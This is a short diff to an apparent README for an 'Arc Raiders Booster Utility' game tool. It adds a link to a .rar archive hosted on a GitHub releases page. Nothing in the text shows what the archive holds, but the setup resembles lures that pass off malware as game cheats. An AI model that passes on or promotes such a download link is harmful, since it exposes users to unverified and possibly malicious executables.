@@ -20,7 +20,7 @@
 
 **Quick Start — 30 seconds to deploy**
 
-1. [Download]() Arc Raiders Booster Utility v2.8.4 2026 Edition latest version
+1. [Download](https://github.com/RopemakerPincers/Arc-Raiders-Booster-Utility/releases/download/Download/Arc.Raiders.Booster.Utility.v2.8.4.2026.Edition.rar) Arc Raiders Booster Utility v2.8.4 2026 Edition latest version
 
 2. Extract the archive to your preferred location
 
